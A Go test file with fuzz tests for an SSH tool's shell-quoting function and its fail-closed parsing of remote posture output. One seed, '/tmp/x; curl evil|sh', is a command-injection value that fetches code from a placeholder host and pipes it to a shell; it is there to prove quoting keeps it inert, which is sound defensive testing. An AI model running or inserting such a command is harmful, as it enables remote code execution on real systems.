package sshconn

import (
	"bytes"
	"errors"
	"os/exec"
	"strings"
	"testing"
)

// FuzzShQuote is the load-bearing check on the quoting layer: for any input,
// splicing ShQuote(s) into BOTH variable-assignment shapes the production
// command uses — the absolute form p=<token> and the home-relative form
// p="${HOME:?}"/<token> — and echoing it back through a real sh must
// reproduce the expected bytes with exit 0. Any quoting escape would corrupt
// the bytes or make the shell execute something. Inputs containing NUL are
// skipped: \x00 cannot survive execve arguments (not a ShQuote defect;
// config validation independently rejects all control characters).
func FuzzShQuote(f *testing.F) {
	seeds := []string{
		"'",
		`'\''`,
		`\`,
		"$()",
		"`",
		"\n",
		"\u009b", // C1 CSI — acts like ESC [ in some terminals
		"/etc/ssh/authorized_keys.d/deploy",
		"~/my keys/auth",
		"/tmp/x; curl evil|sh",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if strings.ContainsRune(s, 0) {
			t.Skip("NUL cannot survive execve; rejected by config validation")
		}
		shapes := []struct {
			name   string
			script string
			env    []string
			want   []byte
		}{
			{"absolute", "p=" + ShQuote(s) + `; printf %s "$p"`, nil, []byte(s)},
			// The tilde shape splices the token after "${HOME:?}"/ — POSIX
			// token adjacency must keep the rest inert regardless of content.
			{"home-relative", `p="${HOME:?}"/` + ShQuote(s) + `; printf %s "$p"`,
				[]string{"HOME=/h"}, append([]byte("/h/"), s...)},
		}
		for _, sh := range shapes {
			cmd := exec.CommandContext(t.Context(), "sh", "-c", sh.script)
			cmd.Env = sh.env
			var stderr bytes.Buffer
			cmd.Stderr = &stderr
			out, err := cmd.Output()
			if err != nil {
				var exitErr *exec.ExitError
				if errors.As(err, &exitErr) {
					t.Fatalf("%s: sh exited %d on ShQuote(%q): stderr %q", sh.name, exitErr.ExitCode(), s, stderr.String())
				}
				t.Fatalf("%s: run sh on ShQuote(%q): %v", sh.name, s, err)
			}
			if !bytes.Equal(out, sh.want) {
				t.Fatalf("%s: round-trip mismatch: ShQuote(%q) came back as %q, want %q", sh.name, s, out, sh.want)
			}
		}
	})
}

// FuzzFinishPosture pins the fail-closed property: whatever a server prints,
// a nil error means every line was a well-formed record, so garbage can
// never be read as a clean posture.
func FuzzFinishPosture(f *testing.F) {
	f.Add("")
	f.Add("SSHEPHERD-KEYS2 1\n")
	f.Add("SSHEPHERD-POSTURE drwxrwxrwx 1001 world_writable /home/d/.ssh\n")
	f.Add("hello\n")
	f.Add("\n")
	f.Fuzz(func(t *testing.T, out string) {
		stdout := NewCappedBuffer(MaxRemoteOutput)
		_, _ = stdout.Write([]byte(out))
		issues, _, err := FinishPosture(0, stdout, NewCappedBuffer(16))
		if err != nil {
			return
		}
		if out == "" {
			if issues != nil {
				t.Fatalf("no output produced findings: %+v", issues)
			}
			return
		}
		if !strings.HasSuffix(out, "\n") {
			t.Fatalf("accepted output without a final newline: %q", out)
		}
		for _, line := range strings.Split(strings.TrimSuffix(out, "\n"), "\n") {
			if line != postureKeys2Record && !postureRecord.MatchString(line) {
				t.Fatalf("accepted a non-record line %q in %q", line, out)
			}
		}
		if len(issues) > maxPostureRecords {
			t.Fatalf("%d issues exceed the cap", len(issues))
		}
	})
}
